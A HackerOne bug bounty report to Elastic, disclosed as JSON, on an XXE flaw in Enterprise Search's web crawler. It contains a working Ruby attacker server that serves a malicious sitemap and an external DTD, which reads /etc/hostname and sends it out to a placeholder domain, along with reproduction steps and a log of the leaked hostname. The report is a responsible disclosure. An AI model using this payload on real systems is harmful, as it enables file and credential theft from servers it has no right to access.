{
  "id": 1156748,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTU2NzQ4",
  "url": "https://hackerone.com/reports/1156748",
  "title": "XXE in Enterprise Search's App Search web crawler",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2021-04-08T04:42:57.032Z",
  "submitted_at": "2021-04-08T04:42:57.058Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dee-see",
    "url": "/dee-see",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23607,
    "url": "https://hackerone.com/elastic",
    "handle": "elastic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Elastic",
      "twitter_handle": "elastic",
      "website": "https://www.elastic.co/",
      "about": "Smarter search. Stronger security. Seamless observability. Uncover real-time insights with Search AI."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-04-29T15:05:10.100Z",
  "bug_reporter_agreed_on_going_public_at": "2021-04-29T15:05:10.011Z",
  "team_member_agreed_on_going_public_at": "2021-04-29T14:57:13.759Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\n\nHello team! The latest version of Enterprise Search (7.12.0) is vulnerable to XXE when [parsing sitemaps](https://www.elastic.co/guide/en/app-search/current/crawl-web-content.html#crawl-web-content-manage-sitemaps). Up to now I'm only able to read file that contain one line. I'm reporting now to avoid duplicates, but I'll keep working to find a way to extract entire files or HTTP request bodies.\n\n## Description\n\nEnterprise Search has a Web Crawler that crawls websites and ingests data to make it searchable. The crawler will look for `robots.txt` files and in that file it will look for the `sitemap` directive. When the sitemap is present, the crawler will parse it and crawl each pages that's listed there.\n\nThe code used to parse the site map is vulnerable to XXE. At the time of reporting I'm limited to exfiltrating only files that contain one line and admittedly this is very limiting, but I'm going to keep looking for ways to bypass this limitation. Once bypassed this has the potential to leak very sensitive data and credentials.\n\n## Steps to reproduce\n\n### Attacker Server\n\nThis is my attacker server, it's a ruby application that requires `sinatra` (`gem install sinatra`)\n\n```ruby\nrequire 'sinatra'\n\nset :bind, '0.0.0.0'\n\nget '/robots.txt' do\n\n  'User-agent: *\nDisallow:\n\nsitemap: /sitemap.xml\n'\nend\n\nget '/sitemap.xml' do\n  content_type 'application/xml'\n\n  '<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE urlset [\n<!ENTITY % dtd SYSTEM \"http://YOURDOMAIN.COM/exfil.dtd\">\n%dtd;\n%param1;\n%exfil;\n]>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n<url>\n    <loc>&test;</loc>\n    <lastmod>2019-06-19</lastmod>\n    <changefreq>daily</changefreq>\n</url>\n</urlset>'\nend\n\nget '/exfil.dtd' do\n  content_type 'application/xml-dtd'\n\n  '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!ENTITY % data SYSTEM \"file:///etc/hostname\">\n<!ENTITY % param1 \"<!ENTITY &#x25; exfil SYSTEM \\'http://YOURDOMAIN.COM/exfil?%data;\\'>\">'\nend\n```\n\nSave that to a file and run it with `ruby server.rb`.\n\n\n### Enterprise Search\n\n1. Log in to Enterprise Search\n1. Click `Launch App Search`\n1. Click `Create an Engine`, give it any name and click `Create Engine`\n1. Click `Use the Web Crawler`\n1. Enter the domain hosting the XXE payload as the `Domain URL`\n1. Click `Start a Crawl` and observe your server logs, you should see the hostname of the targetted machine\n\nRunning this on an Elastic Cloud instance I got this in my log.\n\n```text\n20.55.27.97 - - [08/Apr/2021:04:16:02 UTC] \"GET /exfil?d403d12993e0 HTTP/1.1\" 404 459\n```\n\nWhere `d403d12993e0` is the host name of the machine where my instance is running on. I could also reproduce using the on-premise version.\n\n## Impact\n\nAt the moment I can read a limited number of files. If I can get around the one line limit I'll be able to read credentials and potentially AWS metadata.",
  "weakness": {
    "id": 54,
    "name": "XML External Entities (XXE)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-05-29T14:57:13.885Z",
  "allow_singular_disclosure_after": -136123655.3899781,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "alexbrasetvik",
    "haxor31337",
    "bogdantc",
    "shreyaschavhan",
    "dmc3",
    "superman85",
    "thelilnix",
    "packetsurfer"
  ],
  "severity": {
    "rating": "critical",
    "score": 9.1,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 4424,
    "asset_type": "URL",
    "asset_identifier": "cloud.elastic.co",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
